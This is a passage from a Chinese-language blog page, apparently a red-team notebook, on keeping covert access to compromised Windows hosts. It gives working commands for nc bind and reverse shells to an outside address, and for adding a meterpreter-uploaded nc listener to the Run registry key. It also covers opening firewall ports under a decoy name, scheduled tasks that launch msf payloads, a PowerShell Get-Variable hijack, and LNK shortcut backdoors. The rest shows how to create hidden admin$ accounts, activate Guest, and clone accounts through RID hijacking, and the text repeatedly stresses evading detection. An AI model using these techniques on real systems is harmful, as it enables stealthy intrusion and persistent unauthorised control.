class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</span><br></pre></td></tr></table></figure><h2 id="Winlogon"><a href="#Winlogon" class="headerlink" title="Winlogon"></a>Winlogon</h2><p>注意下面的 Notify、Userinit、Shell键值也会有自启动的程序，而且其键值可以用逗号分隔，从而实现登录的时候启动多个程序。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</span><br></pre></td></tr></table></figure><h1 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h1><p>这里以nc为例，大家思路开放点，比如替换为生成的反弹 shell 的 payload 。</p><blockquote><p>在以下的payload中，如果有特别的显眼的字眼，可以替换为其他的字符，比如nc，这个名字可以替换为其他常见程序~</p><p>一定要注意 正向连接一定要有端口开放，不然防火墙会墙掉！！！！！</p></blockquote><h2 id="简单介绍nc语法"><a href="#简单介绍nc语法" class="headerlink" title="简单介绍nc语法"></a>简单介绍nc语法</h2><p>nc 在Linux和Windows下都可以用</p><blockquote><ul><li>NC.exe常用命令：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">connect to somewhere:   nc [-options] hostname port[s] [ports] ...</span><br><span class="line">listen for inbound:     nc -l -p port [options] [hostname] [port]</span><br><span class="line">options:</span><br><span class="line">        -g&lt;网关&gt; 设置路由器跃程通信网关，最多可设置8个。</span><br><span class="line">-G num          source-routing pointer: 4, 8, 12, ...</span><br><span class="line">        -l 使用监听模式，管控传入的资料。</span><br><span class="line">        -L              listen harder, re-listen on socket close </span><br><span class="line">        -n 直接使用IP地址，而不通过域名服务器。</span><br><span class="line">        -o&lt;输出文件&gt; 指定文件名称，把往来传输的流量数据以16进制字码倾倒成该文件保存。</span><br><span class="line">        -p&lt;通信端口&gt; 设置本地主机使用的通信端口。</span><br><span class="line">        -u 使用UDP传输协议。</span><br><span class="line">        -v 显示指令执行过程。更详细的信息。两次-v会有更多详细信息</span><br><span class="line">        -e 绑定某个程序，使用端口</span><br><span class="line">        -e prog         inbound program to exec [dangerous!!]</span><br><span class="line">        -d              detach from console, background mode       </span><br><span class="line">        -h              this cruft</span><br><span class="line">        -i secs         delay interval for lines sent, ports scanned          </span><br><span class="line">        -r              randomize local and remote ports</span><br><span class="line">        -s addr         local source address</span><br><span class="line">        -t              answer TELNET negotiation</span><br><span class="line">        -w secs         timeout for connects and final net reads</span><br></pre></td></tr></table></figure><ul><li>用nc正向shell</li></ul><p>原理：被控端使用nc将&#x2F;bin&#x2F;sh绑定到本地的6666端口，控制端主动连接被控端的6666端口，即可获得shell</p><blockquote><p>目标机器：</p><blockquote><p>-v:可以显示详细的信息，不过为了隐蔽性我们一般不-v<br>-d:为了隐藏我们的nc，一般是需要-d，以隐藏程序<br>-e:绑定某个程序，使用端口,我们为了反弹shell，将cmd和某个端口绑定，其他机器访问ip+端口即可访问cmd</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc.exe -Lp 5555 -d -e cmd.exe</span><br><span class="line">或者：</span><br><span class="line">nc -lvvp 6666 -e /bin/bash</span><br></pre></td></tr></table></figure><p>控制机器：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc64.exe 目标机器ip 5555</span><br><span class="line">比如：nc 10.10.1.7 6666</span><br></pre></td></tr></table></figure></blockquote><ul><li>用nc反弹shell</li></ul><p>原理： 被控端使用nc将&#x2F;bin&#x2F;sh发送到控制端的6666端口，控制端只需要监听本地的6666端口，即可获得shell。</p><blockquote><p>目标机器：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -e /bin/sh 10.10.1.11 6666</span><br></pre></td></tr></table></figure><p>控制机器：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 6666</span><br></pre></td></tr></table></figure></blockquote></blockquote><h2 id="在-meterpreter-下"><a href="#在-meterpreter-下" class="headerlink" title="在 meterpreter 下"></a>在 meterpreter 下</h2><blockquote><p>meterpreter下已经写好了相应的reg的命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; reg</span><br><span class="line">Usage: reg [command] [options]</span><br><span class="line">Interact with the target machine&#x27;s registry.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -d   The data to store in the registry value.</span><br><span class="line">    -h   Help menu.</span><br><span class="line">    -k   The registry key path (E.g. HKLM\Software\Foo).</span><br><span class="line">    -r   The remote machine name to connect to (with current process credentials</span><br><span class="line">    -t   The registry value type (E.g. REG_SZ).</span><br><span class="line">    -v   The registry value name (E.g. Stuff).</span><br><span class="line">    -w   Set KEY_WOW64 flag, valid values [32|64].</span><br><span class="line">COMMANDS:</span><br><span class="line"></span><br><span class="line">    enumkey     Enumerate the supplied registry key [-k &lt;key&gt;]</span><br><span class="line">    createkey   Create the supplied registry key  [-k &lt;key&gt;]</span><br><span class="line">    deletekey   Delete the supplied registry key  [-k &lt;key&gt;]</span><br><span class="line">    queryclass  Queries the class of the supplied key [-k &lt;key&gt;]</span><br><span class="line">    setval      Set a registry value [-k &lt;key&gt; -v &lt;val&gt; -d &lt;data&gt;]. Use a binary blob to set binary data with REG_BINARY type (e.g. setval -d ef4ba278)</span><br><span class="line">    deleteval   Delete the supplied registry value [-k &lt;key&gt; -v &lt;val&gt;]</span><br><span class="line">    queryval    Queries the data contents of a value [-k &lt;key&gt; -v &lt;val&gt;]</span><br></pre></td></tr></table></figure></blockquote><p>#参数的含义 在上面都有讲</p><ol><li>上传nc</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload /root/nc.exe C:\\windows\\system32</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208252323645.png" alt="image-20220825232315482"></p><ol start="2"><li>查询注册表项</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208252325723.png" alt="image-20220825232520555"></p><ol start="3"><li>设置注册表项的值</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d &#x27;C:\windows\system32\nc.exe -Ldp 5555 -e cmd.exe&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208252326358.png" alt="image-20220825232613173"></p><ol start="4"><li>查看注册表项的值</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208252326060.png" alt="image-20220825232647904"></p><ol start="5"><li>&#x3D;&#x3D;关于防火墙&#x3D;&#x3D;</li></ol><p>#从外面访问内部的时候，可能会被防火墙墙掉，如果是直接关闭防火墙又太过明显，我们可以开启某个端口~~~</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">execute –f cmd –i –<span class="built_in">H</span></span><br><span class="line">netsh firewall show opmode</span><br><span class="line">netsh firewall add portopening TCP <span class="number">5555</span> <span class="string">&quot;QQ&quot;</span> ENABLE ALL</span><br><span class="line"><span class="comment">#重启生效</span></span><br><span class="line">shutdown <span class="literal">-r</span> <span class="operator">-f</span> <span class="literal">-t</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><ol start="6"><li>msf开启socks5代理:</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">run</span><br></pre></td></tr></table></figure><ol start="7"><li>配置proxychains</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208252332889.png" alt="image-20220825233232726" style="zoom: 50%;" /><ol start="8"><li>配置msf路由</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/multi/manage/autoroute</span><br><span class="line">run autoroute -p</span><br><span class="line">run autoroute -s 192.168.1.0/24</span><br></pre></td></tr></table></figure><ol start="9"><li>通过proxychains，nc正向连接</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains nc 192.168.1.132 5555</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208252350917.png" alt="image-20220825235050673" style="zoom:50%;" /><h2 id="在目标-cmd-下"><a href="#在目标-cmd-下" class="headerlink" title="在目标 cmd 下"></a>在目标 cmd 下</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload /root/nc.exe C:\\windows\\system32</span><br><span class="line">shell</span><br><span class="line">reg query HKLM\software\microsoft\windows\currentversion\run</span><br><span class="line">reg add HKLM\software\microsoft\windows\currentversion\run /v </span><br><span class="line">nc /t REG_SZ /d &quot;C:\windows\system32\nc.exe -Ldp 5555 -e cmd.exe&quot;</span><br><span class="line">reg query HKLM\software\microsoft\windows\currentversion\run /v nc</span><br><span class="line"></span><br><span class="line">execute –f cmd –i –H</span><br><span class="line">netsh firewall show opmode</span><br><span class="line">netsh firewall add portopening TCP 5555 &quot;QQ&quot; ENABLE ALL</span><br><span class="line">shutdown -r -f -t 0</span><br></pre></td></tr></table></figure><h1 id="schtasks计划任务-很常见"><a href="#schtasks计划任务-很常见" class="headerlink" title="schtasks计划任务 (很常见)"></a>schtasks计划任务 (很常见)</h1><h2 id="查看计划任务："><a href="#查看计划任务：" class="headerlink" title="查看计划任务："></a>查看计划任务：</h2><ul><li>taskschd.msc 调出计划任务图形界面(推荐)</li><li>schtasks &#x2F;query</li><li>cmd命令：schtasks&gt;schtasks.txt</li><li>powshell命令：Get-ScheduledTask</li><li>单击【开始】&gt;【运行】；输入 cmd，然后输入at( schtasks.exe)，检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接。</li><li>单击【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】，查看计划任务属性，便可以发现木马文件的路径。</li></ul><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>创建test定时任务，每分钟执行一次5555.exe</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">schtasks /create /<span class="built_in">sc</span> MINUTE /mo <span class="number">1</span> /tr C:\Users\Administrator\Desktop\msf_6666_win64.exe /tn test</span><br><span class="line"><span class="comment">#删除</span></span><br><span class="line">schtasks /delete /tn test</span><br><span class="line"><span class="comment">#查询</span></span><br><span class="line">schtasks /query /tn test</span><br></pre></td></tr></table></figure><h2 id="命令解析"><a href="#命令解析" class="headerlink" title="命令解析"></a>命令解析</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看帮助</span><br><span class="line">SCHTASKS /Create /?</span><br><span class="line"></span><br><span class="line">#创建新的计划任务</span><br><span class="line">schtasks /create</span><br><span class="line">指定计划类型。有效值为 MINUTE、HOURLY、DAILY、WEEKLY、MONTHLY、ONCE、ONSTART、ONLOGON、ONIDLE。</span><br><span class="line"></span><br><span class="line">#频率</span><br><span class="line">/sc schedule</span><br><span class="line">指定任务在其计划类型内的运行频率。</span><br><span class="line">有效计划任务:  MINUTE、 HOURLY、DAILY、WEEKLY、MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE, ONEVENT.</span><br><span class="line"></span><br><span class="line">#频率的数量</span><br><span class="line">/mo modifier</span><br><span class="line">改进计划类型以允许更好地控制计划重复周期。有效值列于下面“修改者”部分中。这个参数对于 MONTHLY 计划是必需的。对于MINUTE、HOURLY、DAILY 或 WEEKLY 计划，这个参数有效，但也可选。默认值为 1。</span><br><span class="line">修改者: 按计划类型的 /MO 开关的有效值:</span><br><span class="line">    MINUTE:  1 到 1439 分钟。</span><br><span class="line">    HOURLY:  1 - 23 小时。</span><br><span class="line">    DAILY:   1 到 365 天。</span><br><span class="line">    WEEKLY:  1 到 52 周。</span><br><span class="line">    ONCE:    无修改者。</span><br><span class="line">    ONSTART: 无修改者。</span><br><span class="line">    ONLOGON: 无修改者。</span><br><span class="line">    ONIDLE:  无修改者。</span><br><span class="line">    MONTHLY: 1 到 12，或</span><br><span class="line">             FIRST, SECOND, THIRD, FOURTH, LAST, LASTDAY。</span><br><span class="line">    ONEVENT:  XPath 事件查询字符串</span><br><span class="line"></span><br><span class="line">#执行的程序或者命令    </span><br><span class="line">/tr &lt;TaskRun&gt;</span><br><span class="line">指定任务运行的程序或命令。如果忽略该路径，SchTasks.exe 将假定文件在Systemroot\System32 目录下。</span><br><span class="line"></span><br><span class="line">#指定任务的名称。</span><br><span class="line">/tn &lt;TaskName&gt;</span><br></pre></td></tr></table></figure><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><blockquote><p>schtasks命令详解：<a href="https://www.cnblogs.com/visoeclipse/archive/2009/08/29/1556240.html">https://www.cnblogs.com/visoeclipse/archive/2009/08/29/1556240.html</a></p></blockquote><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#每分钟执行一次任务。</span></span><br><span class="line">schtasks /create /<span class="built_in">sc</span> MINUTE /mo <span class="number">1</span> /tn calc_update /tr <span class="string">&quot;C:\Users\Administrator\Desktop\mx\5555.exe&quot;</span></span><br><span class="line"><span class="comment">#每小时执行一次任务。</span></span><br><span class="line">schtasks /create /<span class="built_in">sc</span> HOURLY /mo <span class="number">1</span> /tn calc_update /tr  <span class="string">&quot;C:\Users\Administrator\Desktop\mx\5555.exe&quot;</span></span><br><span class="line"><span class="comment">#每天执行一次任务。</span></span><br><span class="line">schtasks /create /<span class="built_in">sc</span> DAILY /mo <span class="number">1</span> /tn calc_update /tr  <span class="string">&quot;C:\Users\Administrator\Desktop\mx\5555.exe&quot;</span></span><br><span class="line"><span class="comment">#删除计划任务。</span></span><br><span class="line">schtasks /Delete /TN 任务名称 /F</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#示例:</span></span><br><span class="line"><span class="comment">#比如说hexo每隔三十分钟自动更新</span></span><br><span class="line"><span class="comment">#不能同时用两次双引号怎么办？</span></span><br><span class="line">schtasks /create /<span class="built_in">sc</span> MINUTE /mo <span class="number">30</span> /tn hexo_update /tr <span class="string">&quot;cmd /c &quot;</span>F: &amp;&amp; <span class="built_in">cd</span> F:\Haoran\桌面\myblog &amp;&amp; hexo g <span class="literal">-d</span><span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#这个命令却意外的生成了正确的计划任务</span></span><br><span class="line">schtasks /create /<span class="built_in">sc</span> MINUTE /mo <span class="number">30</span> /tn hexo_update /tr <span class="string">&quot;cmd /c &#x27;F: &amp;&amp; cd F:\Haoran\桌面\myblog &amp;&amp; hexo g -d&quot;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">#执行结果</span></span><br><span class="line"><span class="string">成功: 成功创建计划任务 &quot;hexo_update&quot;。</span></span><br><span class="line"><span class="string">#输入taskschd.msc查看计划任务</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#官方实例：</span></span><br><span class="line"><span class="string">==&gt; 在远程机器 &quot;ABC&quot; 上创建计划任务 &quot;doc&quot;，该机器每小时在 &quot;runasuser&quot; 用户下运行 notepad.exe。</span></span><br><span class="line"><span class="string">SCHTASKS /Create /S ABC /U user /P password /RU runasuser /RP runaspassword /SC HOURLY /TN doc /TR notepad</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">==&gt; 在远程机器 &quot;ABC&quot; 上创建计划任务 &quot;accountant&quot;，在指定的开始日期和结束日期之间的开始时间和结束时间内，每隔五分钟运行 calc.exe。</span></span><br><span class="line"><span class="string">SCHTASKS /Create /S ABC /U domain\user /P password /SC MINUTE /MO 5 /TN accountant /TR calc.exe /ST 12:00 /ET 14:00 /SD 06/06/2006 /ED 06/06/2006 /RU runasuser /RP userpassword</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">==&gt; 创建计划任务 &quot;gametime&quot;，在每月的第一个星期天运行“空当接龙”。</span></span><br><span class="line"><span class="string">SCHTASKS /Create /SC MONTHLY /MO first /D SUN /TN gametime /TR c:\windows\system32\freecell</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">==&gt; 在远程机器 &quot;ABC&quot; 创建计划任务 &quot;report&quot;，每个星期运行 notepad.exe。</span></span><br><span class="line"><span class="string">SCHTASKS /Create /S ABC /U user /P password /RU runasuser /RP runaspassword /SC WEEKLY /TN report /TR notepad.exe</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">==&gt; 在远程机器 &quot;ABC&quot; 创建计划任务 &quot;logtracker&quot;，每隔五分钟从指定的开始时间到无结束时间，运行 notepad.exe。将提示输入 /RP 码。</span></span><br><span class="line"><span class="string">SCHTASKS /Create /S ABC /U domain\user /P password /SC MINUTE /MO 5 /TN logtracker /TR c:\windows\system32\notepad.exe /ST 18:30 /RU runasuser /RP</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">==&gt; 创建计划任务 &quot;gaming&quot;，每天从 12:00 点开始到14:00 点自动结束，运行 freecell.exe。</span></span><br><span class="line"><span class="string">SCHTASKS /Create /SC DAILY /TN gaming /TR c:\freecell /ST 12:00 /ET 14:00 /K</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">==&gt; 创建计划任务“EventLog”以开始运行 wevtvwr.msc只要在“系统”通道中发布事件 101</span></span><br><span class="line"><span class="string">SCHTASKS /Create /TN EventLog /TR wevtvwr.msc /SC ONEVENT /EC System /MO *[System/EventID=101]</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">==&gt; 文件路径中可以加入空格，但需要加上两组引号，一组引号用于 CMD.EXE，另一组用于 SchTasks.exe。用于 CMD的外部引号必须是一对双引号；内部引号可以是一对单引号或一对转义双引号:</span></span><br><span class="line"><span class="string">SCHTASKS /Create /tr &quot;&#x27;</span>c:\program files\internet explorer\iexplorer.exe<span class="string">&#x27; \&quot;c:\log data\today.xml\&quot;&quot; ...</span></span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209021206058.png" alt="image-20220902120649773"></p><h4 id="输入taskschd-msc查看计划任务"><a href="#输入taskschd-msc查看计划任务" class="headerlink" title="输入taskschd.msc查看计划任务"></a>输入taskschd.msc查看计划任务</h4><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209022159661.png" alt="image-20220902215958413" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209022209833.png" alt="image-20220902220949582" style="zoom: 33%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209022210135.png" alt="image-20220902221014958" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209022210895.png" alt="image-20220902221042649" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209022210792.png" alt="image-20220902221059540" style="zoom:50%;" /><h2 id="Task-Powershell"><a href="#Task-Powershell" class="headerlink" title="Task-Powershell"></a>Task-Powershell</h2><blockquote><p><a href="https://github.com/re4lity/Schtasks-Backdoor">https://github.com/re4lity/Schtasks-Backdoor</a></p></blockquote><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211346068.png" alt="image-20220821134634881"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211346981.png" alt="image-20220821134647829"></p><h2 id="较新的权限维持方法"><a href="#较新的权限维持方法" class="headerlink" title="较新的权限维持方法"></a>较新的权限维持方法</h2><blockquote><p>算一个漏洞，新的机器大概率会修复，不过很多机器不一定修复</p><p>参考：<a href="https://mp.weixin.qq.com/s/Tt6REDrPH-WWgMB-mIOnTA">计划任务启动PowerShell.exe实现持久化</a></p></blockquote><h3 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h3><p>利用PowerShell启动时执行Get-Variable执行恶意文件<br>1.将恶意程序放在<code>%APPDATA%Local\Microsoft\WindowsApps</code>目录下并重命名为<code>Get-Variable.exe</code><br>2.创建计划任务实现持久化</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks.exe /create /tn COMSurrogate /st 00:00 /du 9999:59 /sc once /ri 1 /f tr &quot;powershell.exe -windowstyle hidden&quot;</span><br><span class="line"></span><br><span class="line">#powershell.exe -windowstyle hidden 中-windowstyle设置powershell.exe的窗口风格~~隐藏</span><br></pre></td></tr></table></figure><p>该命令创建计划任务程序COMSurrogate,该程序以隐藏的方式执行PowerShell。而执行PowerShe1l会启动恶意程序Get-Variable.exe,从而实现持久化。</p><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>在执行powershell的时候，powershell会做一个类似在机器目录中查找环境变量的操作，会找到<code>%APPDATA%Local\Microsoft\WindowsApps</code>目录下面，如果看到该目录下面有个Get-variable.exe会默认执行~~。我们只需要将该目录下的Get-variable.exe替换为后门即可~</p><p>总结来说便是：<strong>通过运行PowerShell时触发执行Get-variable来实现攻击</strong></p><h3 id="具体原理细节："><a href="#具体原理细节：" class="headerlink" title="具体原理细节："></a>具体原理细节：</h3><p>执行PowerShell ，在Process monitor观察PowerShell 对Get-variable.exe的操作可知：</p><p>首先，PowerShell 遍历系统环境变量路径下是否存在：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208260058264.png" alt="图片"></p><p>然后遍历在用户环境变量路径下是否存在：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208260058150.png" alt="图片"></p><p>其中用户环境变量包括路径%APPDATA%\Local\Microsoft\WindowsApps：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208260058250.png" alt="图片"></p><p>当发现该文件时，调用该文件并使用参数Name host ValueOnly 执行:<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208260059983.png" alt="图片"></p><p>该<code>Get-Variable host -ValueOnly</code>命令用于在Windows上获取主机操作系统信息，如下：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208260059929.png" alt="图片"></p><p>PowerShell在启动时会尝试执行该命令获取控制台主机信息,根据控制台主机信息的配置去启动PowerShell，如中英文设置、UI设置。</p><p>因此，我们可以发现：该机制类似dll劫持，PowerShell按顺序在系统和用户的环境变量中搜索Get-variable并执行，所以将恶意文件重命名为Get-variable.exe并放置在PowerShell的搜索路径中，就可以在启动PowerShell时执行恶意文件。</p><p>而使用路径%APPDATA%\Local\Microsoft\WindowsApps的原因是：<strong>在Win10上默认的用户环境变量中存在该路径，且将文件复制进该文件夹不需要特殊权限，具有普遍性,容易利用。</strong></p><p>经过测试发现，仅有该cmdlet放置在WindowsApps下时可以触发执行。</p><h2 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h2><blockquote><p><a href="https://paper.seebug.org/1464/#_8">windows 计划任务隐藏新姿势分享</a></p></blockquote><h1 id="快捷方式劫持"><a href="#快捷方式劫持" class="headerlink" title="快捷方式劫持"></a>快捷方式劫持</h1><p>Windows快捷方式包含对系统上安装的软件或文件位置(网络或本地)的引用。快捷方式的文件扩展名是.LNK，它为红队提供了很多机会来执行各种格式的代码 exe、vbs、Powershell、scriptlet  等。invoke-item在powershell中就是指唤醒程序</p><p><strong>在执行快捷方式的时候 无感唤醒后门~~</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c &quot;invoke-item &#x27;C:\Windows\system32\cmd.exe&#x27;; invoke-item C:\Users\Administrator\DeSsktop\msf_6666_win64.exe&quot;</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208260933022.png" alt="image-20220826093326825" style="zoom: 50%;" /><h1 id="账户隐藏"><a href="#账户隐藏" class="headerlink" title="账户隐藏"></a>账户隐藏</h1><blockquote><ul><li><p>后门可能被杀软查杀，隐藏账户就很直接</p></li><li><p>lusrmgr.msc查看管理员组下有无新成员</p></li><li><p>命令行：</p></li></ul><blockquote><ul><li>wmic useraccount</li><li>net user</li><li>net localgroup administrators</li></ul></blockquote><ul><li>D盾_web查杀工具可以检查隐藏账号、克隆账号</li></ul></blockquote><ul><li>隐藏用户</li></ul><p>通过 net user  命令查看不到，但是在控制面板的管理账户界面可以查看到。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#添加账户</span><br><span class="line">net user 用户名 密码 /add</span><br><span class="line">#组中添加用户</span><br><span class="line">net localgroup 组 用户名 /add</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user admin$ AdminPass /add &amp;&amp; net localgroup administrators admin$ /add</span><br></pre></td></tr></table></figure><ul><li>激活Guest用户</li></ul><blockquote><p>&#x2F;active:no表示禁用</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user guest Admin@hacker &amp;&amp; net localgroup administrators guest /add</span><br><span class="line">net user guest /active:yes</span><br></pre></td></tr></table></figure><h1 id="RID劫持-隐蔽性好-克隆账户"><a href="#RID劫持-隐蔽性好-克隆账户" class="headerlink" title="RID劫持 (隐蔽性好)(克隆账户)"></a>RID劫持 (隐蔽性好)(克隆账户)</h1><blockquote><p>参考：<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F">渗透技巧-Windows系统的帐户隐藏</a></p></blockquote><p>写入注册表，创建克隆 administrator  账号，且通过命令 net user  以及<strong>控制面板中的管理账户</strong>无法看到。注意！！！控制面板中的管理账户也无法看到！！！！</p><h2 id="隐藏步骤"><a href="#隐藏步骤" class="headerlink" title="隐藏步骤"></a>隐藏步骤</h2><ol><li>用’$’创建匿名用户，并归到administrators和remote desktop users用户组（归入对应组就拥有了管理员和远程桌面的权限）</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user admin$ AdminPass /add /y</span><br><span class="line">net localgroup administrators admin$ /add</span><br><span class="line">net localgroup &quot;remote desktop users&quot; admin$ /add</span><br></pre></td></tr></table></figure><ol start="2"><li>对注册表赋予权限</li></ol><p>默认注册表<code>HKEY_LOCAL_MACHINE\SAM\SAM\</code>只有system权限才能修改。因此需要给 Administrator  用户赋予 Sam  键值权限，默认是不允许的。现在需要为其添加管理员权限~~</p><p>右键-权限-选中Administrators，允许完全控制。如下图</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208261531600.png" alt="Alt text" style="zoom:50%;" /><p>重新启动注册表regedit.exe，获得对该键值的修改权限。</p><ol start="3"><li>导出注册表</li></ol><p>在注册表<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</code>下找到新建的帐户admin$。获取默认类型为<code>0x3ea</code>,将注册表HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\admin$导出为<strong>1.reg</strong></p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208261534789.png" alt="Alt text" style="zoom:50%;" /><p>在注册表下能够找到对应类型名称的注册表项<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003EA</code>。右键将该键导出为<code>2.reg</code>。如下图</p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-10/2-5.png" alt="Alt text" style="zoom:50%;" /><p>默认情况下，管理员帐户Administrator对应的注册表键值为<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4</code>。同样，右键将该键导出为<code>3.reg</code></p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208261606001.png" alt="image-20220826160641524" style="zoom:50%;" /><ol start="4"><li>将 administrator  用户对应的 Users  中的F值复制替换后门账户的F值</li></ol><blockquote><p>注册表中的F值类似权限的意思，授予了相应的F值即具备对应权限</p></blockquote><p>将注册表项<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003EA</code>下键F的值替换为<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4</code>下键F的值，即2.reg中键F的值替换成3.reg中键F的值</p><ol start="5"><li>通过命令删除刚才的后门用户</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user admin$ /del</span><br></pre></td></tr></table></figure><ol start="6"><li>通过注册表导入刚才导出的两个注册表文件</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">regedit /s 1.reg</span><br><span class="line">regedit /s 2.reg</span><br></pre></td></tr></table></figure><p>用先前导出的注册表键值对注册表进行修改。则可以重新还原之前的匿名用户，但是除了在注册表里面有用户记录，其他地方都不存在用户的信息。</p><p><strong>&#x3D;&#x3D;net user 或计算机管理里本地用户和用户组是看不到用户信息的，具有很好的隐蔽性质。&#x3D;&#x3D;</strong></p><p>隐藏账户制做完成，控制面板不存在帐户test$</p><p>通过net user无法列出该帐户</p><p>计算机管理-本地用户和组-用户也无法列出该帐户</p><p>但可通过如下方式查看：</p><figure 